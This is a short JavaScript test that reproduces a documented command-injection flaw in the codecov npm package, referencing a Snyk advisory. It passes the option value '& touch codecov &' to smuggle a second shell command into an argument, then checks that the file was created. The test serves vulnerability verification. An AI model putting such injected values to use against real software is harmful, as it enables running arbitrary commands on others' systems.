//https://snyk.io/vuln/SNYK-JS-CODECOV-548879
test("Command Injection in codecov", () => {
  const root = require("codecov");
  const fs = require("fs");
  const path = "./codecov";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let args = {
    options: {
      "gcov-root": "& touch codecov &",
      "gcov-exec": " ",
      "gcov-args": " ",
    },
  };
  try {
    root.handleInput.upload(
      args,
      function () {},
      function () {}
    );
  } catch (error) {}
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
